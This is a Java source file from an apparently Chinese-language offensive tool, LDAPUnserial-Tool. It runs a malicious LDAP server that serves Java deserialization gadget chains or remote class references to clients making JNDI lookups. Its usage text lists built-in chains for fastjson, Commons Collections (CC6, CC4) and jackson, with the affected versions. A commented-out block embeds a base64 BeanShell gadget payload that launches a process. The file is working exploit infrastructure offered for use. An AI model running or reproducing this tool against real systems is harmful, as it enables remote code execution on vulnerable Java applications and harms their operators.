package org.c3p0ooo;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import org.interceptor.HTTPOperationInterceptor;
import org.interceptor.SerialOperationInterceptor;
import org.util.CC4;
import org.util.Gadget;
import sun.misc.BASE64Decoder;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.FileInputStream;
import java.net.InetAddress;

public class LDAPRefServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] args) throws Exception {
        System.out.println(" 使用：");
        System.out.println("【1】LDAP反序列化方式：java -jar LDAPUnserial-Tool.jar LDAP端口 base64/file base64编码后的链/序列化文件路径");
        System.out.println("【2】请求实例化Class方式：java -jar LDAPUnserial-Tool.jar LDAP端口 class http://xxx.xxx.xxx.xxx:xx/x.class");
        System.out.println("【3】内置链：java -jar LDAPUnserial-Tool.jar LDAP端口 gadget -h");
        System.out.println(" 客户端请求：ldap://ip:port/Exploit（名字随意）");
        System.out.println("------------------------------------------------------------------------");
        int ldap_port = Integer.valueOf(args[0]);
        String gadgetType = args[1];
        if(gadgetType.equals("base64")){
            String gadget = args[2];
            BASE64Decoder base64Decoder = new BASE64Decoder();
            byte[] decode = base64Decoder.decodeBuffer(gadget);
            lanuchLDAPServer(ldap_port, decode);
        }else if(gadgetType.equals("file")){
            FileInputStream fis = new FileInputStream(args[2]);
            byte[] bytes = new byte[fis.available()];
            fis.read(bytes);
            lanuchLDAPServer(ldap_port, bytes);
        }else if(gadgetType.equals("class")) {
            String url = args[2];
            HTTPLDAPServer(ldap_port, url);
        }else if(gadgetType.equals("gadget")){
            String gadgetName = "";
            String common = "";
            if(args.length >= 3) {gadgetName = args[2];}
            if(args.length >= 4) {
                common = args[3];
                if(common.startsWith("\"") && common.endsWith("\"")){
                    common = common.substring(1, common.length() - 1);
                }
                System.out.println("执行的命令为：" + common);
            }
            if(gadgetName.isEmpty() || gadgetName.equals("-h")){
                System.out.println("用法：java -jar LDAPUnserial-Tool.jar LDAP端口 gadget fastjson \"命令\"(必须双引号)");
                System.out.println("目前支持的链：\nfastjson (影响版本：1.2.49-1.2.83)\n" +
                        "CC6 (影响版本：<= commons-collections 3.2.1)\n" +
                        "CC4 (影响版本：commons-collections4 4.0)\n" +
                        "jackson (影响版本：jackson-databind 2.10.0及以上版本)");
            }else if(common.isEmpty()){
                System.out.println("命令不能为空！");
            }else if(gadgetName.equals("fastjson")){
                byte[] bytes = Gadget.fastjson49_83(common);
                lanuchLDAPServer(ldap_port, bytes);
            }else if(gadgetName.equals("CC6")){
                byte[] bytes = Gadget.cc6(common);
                lanuchLDAPServer(ldap_port, bytes);
            }else if(gadgetName.equals("jackson")){
                byte[] bytes = Gadget.jackson(common);
                lanuchLDAPServer(ldap_port, bytes);
            }else if(gadgetName.equals("CC4")){
                byte[] bytes = CC4.cc4(common);
                lanuchLDAPServer(ldap_port, bytes);
            }else{
                System.out.println("暂不支持该链！");
            }
        }else {
            System.out.println("类型错误");
        }
    }

//        public static void main(String[] args) throws Exception {
//            System.out.println("java -cp LDAPUnserial-Tool.jar LDAPRefServer LDAP端口 base64编码后的链");
//            System.out.println("客户端请求：ldap://ip:port/Exploit");
//            System.out.println("CommonsCollections版本为3.x: 建议使用CC6");
//            System.out.println("CommonsCollections版本为4.x: 建议使用CC2、CC4");
//            System.out.println("------------------------------------------------------------------------");
//    //        int ldap_port = Integer.valueOf(args[0]);
//    //        String gadget = args[1];
//            int ldap_port = 1389;
//    //        String gadget = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc30AAAABABRqYXZhLnV0aWwuQ29tcGFyYXRvcnhyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyABFic2guWFRoaXMkSGFuZGxlcjgWChI6MBQ4AgABTAAGdGhpcyQwdAALTGJzaC9YVGhpczt4cHNyAAlic2guWFRoaXNzLU0a91ZY6gIAAkwACmludGVyZmFjZXN0ABVMamF2YS91dGlsL0hhc2h0YWJsZTtMABFpbnZvY2F0aW9uSGFuZGxlcnEAfgAFeHIACGJzaC5UaGlzgNHNUW1IezACAAFMAAluYW1lc3BhY2V0AA9MYnNoL05hbWVTcGFjZTt4cHNyAA1ic2guTmFtZVNwYWNl+0FmyzERSxIDABJaAAdpc0NsYXNzWgAIaXNNZXRob2RMAA5jYWxsZXJJbmZvTm9kZXQAEExic2gvU2ltcGxlTm9kZTtMAA1jbGFzc0luc3RhbmNldAASTGphdmEvbGFuZy9PYmplY3Q7TAALY2xhc3NTdGF0aWN0ABFMamF2YS9sYW5nL0NsYXNzO0wAD2ltcG9ydGVkQ2xhc3Nlc3EAfgALTAAQaW1wb3J0ZWRDb21tYW5kc3QAEkxqYXZhL3V0aWwvVmVjdG9yO0wAD2ltcG9ydGVkT2JqZWN0c3EAfgATTAAQaW1wb3J0ZWRQYWNrYWdlc3EAfgATTAAOaW1wb3J0ZWRTdGF0aWNxAH4AE0wAB21ldGhvZHNxAH4AC0wAE25hbWVTb3VyY2VMaXN0ZW5lcnNxAH4AE0wABW5hbWVzcQB+AAtMAAZuc05hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAtwYWNrYWdlTmFtZXEAfgAUTAAGcGFyZW50cQB+AA1MAA10aGlzUmVmZXJlbmNldAAKTGJzaC9UaGlzO0wACXZhcmlhYmxlc3EAfgALeHAAAHBwcHNyABNqYXZhLnV0aWwuSGFzaHRhYmxlE7sPJSFK5LgDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAACHcIAAAACwAAAAJ0AAtJbnRlcnByZXRlcnQAD2JzaC5JbnRlcnByZXRlcnQACUV2YWxFcnJvcnQADWJzaC5FdmFsRXJyb3J4c3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuvAQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAp0AA0vYnNoL2NvbW1hbmRzcHBwcHBwcHBweHBzcQB+AB0AAAAAAAAACHVxAH4AIAAAAAp0ABFqYXZheC5zd2luZy5ldmVudHQAC2phdmF4LnN3aW5ndAAOamF2YS5hd3QuZXZlbnR0AAhqYXZhLmF3dHQACGphdmEubmV0dAAJamF2YS51dGlsdAAHamF2YS5pb3QACWphdmEubGFuZ3BweHBzcQB+ABc/QAAAAAAACHcIAAAACwAAAAF0AAdjb21wYXJlc3IADWJzaC5Cc2hNZXRob2RX7bSF0qjJ/gIACkkAB251bUFyZ3NbAAtjcGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO0wAC2NyZXR1cm5UeXBlcQB+ABJMABJkZWNsYXJpbmdOYW1lU3BhY2VxAH4ADUwACmphdmFNZXRob2R0ABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kO0wACmphdmFPYmplY3RxAH4AEUwACm1ldGhvZEJvZHl0AA5MYnNoL0JTSEJsb2NrO0wACW1vZGlmaWVyc3QAD0xic2gvTW9kaWZpZXJzO0wABG5hbWVxAH4AFFsACnBhcmFtTmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7eHAAAAACdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwcQB+ADlwcQB+ABZwcHNyAAxic2guQlNIQmxvY2uiEkBk6Ak25wIAAVoADmlzU3luY2hyb25pemVkeHIADmJzaC5TaW1wbGVOb2RlS4x9ejNnsl0CAAZJ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";
//            String url = "http://127.0.0.1:8000/a.class";
//            HTTPLDAPServer(ldap_port, url);
//        }

    public static void lanuchLDAPServer(Integer ldap_port, byte[] gadget) throws Exception {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    ldap_port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new SerialOperationInterceptor(gadget));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + ldap_port);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void HTTPLDAPServer(Integer ldap_port, String url) throws Exception {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    ldap_port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new HTTPOperationInterceptor(url));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + ldap_port);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
